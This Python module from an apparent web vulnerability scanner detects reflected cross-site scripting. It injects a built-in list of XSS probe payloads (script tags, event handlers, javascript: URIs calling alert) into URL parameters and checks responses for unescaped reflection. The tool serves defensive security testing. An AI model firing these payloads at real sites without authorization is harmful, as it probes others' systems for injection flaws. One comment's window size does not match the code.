"""
modules/xss.py
--------------
Cross-Site Scripting (XSS) detection module.

Detects reflected XSS by:
- Injecting payloads into URL parameters
- Checking if the raw payload is reflected in the response body
- Looking for unescaped HTML/JS context in the response
"""

import time
import html
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any

from modules.base import BaseModule
from utils.helpers import extract_params, inject_param


DEFAULT_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)",
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    '";alert(1)//',
    "</script><script>alert(1)</script>",
    "<details/open/ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocusin=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "'\"><script>alert(document.domain)</script>",
    # HTML entity bypass attempts
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<<script>alert(1)//<</script>",
    # Event handler payloads
    "' onmouseover='alert(1)'",
    '" onmouseover="alert(1)"',
    "' onclick='alert(1)'",
    "<a href=javascript:alert(1)>click</a>",
]


class XSSModule(BaseModule):
    """
    Reflected XSS detection module.

    Methodology:
    1. Inject XSS payloads into URL parameters
    2. Check if payload is reflected verbatim (unescaped) in response
    3. Check for partial reflection with HTML context analysis
    """

    def load_payloads(self) -> List[str]:
        """Load XSS payloads from wordlist or defaults."""
        if self.config.wordlist:
            return self._load_external_wordlist(self.config.wordlist)
        return DEFAULT_XSS_PAYLOADS

    def execute(self) -> List[Dict[str, Any]]:
        """
        Run XSS scan across all URL parameters.

        Returns:
            List of result dicts.
        """
        payloads = self.load_payloads()
        self.logger.info(f"[+] {len(payloads)} XSS payloads loaded")

        params = extract_params(self.config.url, self.config.param)
        if not params:
            self.logger.warning("[!] No injectable parameters found in URL")
            return []

        self.logger.info(f"[+] Parameters detected: {', '.join(params)}")

        jobs = [(payload, param) for param in params for payload in payloads]
        self.logger.info(f"[*] Testing {len(jobs)} payload/param combinations...")

        results = []
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = {
                executor.submit(self._test_payload, payload, param): (payload, param)
                for payload, param in jobs
            }
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    if result.get("vulnerable"):
                        self.logger.info(
                            f"  [VULN] Param='{result['param']}' "
                            f"Payload='{result['payload'][:50]}' "
                            f"| {result['evidence']}"
                        )

        return results

    def _test_payload(self, payload: str, param: str) -> Dict[str, Any]:
        """Inject payload and test for reflection. Delay applied per-worker."""
        if self.config.delay:
            time.sleep(self.config.delay)

        injected_url = inject_param(self.config.url, param, payload)
        response = self.http.get(injected_url)

        if response is None:
            return {
                "payload": payload,
                "param": param,
                "vulnerable": False,
                "evidence": "No response",
                "url": injected_url,
            }

        return self.analyze_response(response, payload, param)

    def analyze_response(self, response, payload: str, param: str, **kwargs) -> Dict[str, Any]:
        """
        Check if payload is reflected unescaped in the response.

        Levels of detection:
        1. Verbatim payload in body (strongest signal — confirmed vuln)
        2. HTML-encoded reflection detected → NOT vulnerable (browser won't execute)
        3. Key XSS tokens reflected ONLY if the payload itself was not HTML-encoded
        """
        result = {
            "payload": payload,
            "param": param,
            "vulnerable": False,
            "evidence": "",
            "status_code": response.status_code,
            "response_length": len(response.content),
            "url": response.url if hasattr(response, "url") else self.config.url,
        }

        body = response.text
        encoded = html.escape(payload)

        # Check 1: Verbatim reflection (unescaped) — confirmed exploitable
        if payload in body:
            result["vulnerable"] = True
            result["evidence"] = "Payload reflected verbatim in response"
            return result

        # Check 2: HTML-encoded reflection — NOT exploitable
        if encoded != payload and encoded in body:
            result["vulnerable"] = False
            result["evidence"] = "Payload reflected but HTML-encoded (not exploitable)"
            return result

        # Check 3: Key XSS tokens reflected ONLY around the injection point.
        # We search a window of text around where the payload would appear to avoid
        # flagging tokens that exist in the page's own legitimate scripts.
        key_tokens = ["<script>", "onerror=", "onload=", "javascript:alert"]
        # Find approximate injection reflection point — locate any fragment of payload
        anchor = payload[:10].lower() if len(payload) >= 10 else payload.lower()
        idx = body.lower().find(anchor)
        if idx != -1:
            # Check a ±500 char window around the reflected fragment
            window = body[max(0, idx - 50): idx + len(payload) + 50].lower()
            for token in key_tokens:
                if token.lower() in window:
                    result["vulnerable"] = True
                    result["evidence"] = f"Key XSS token '{token}' found near injection point"
                    return result

        return result
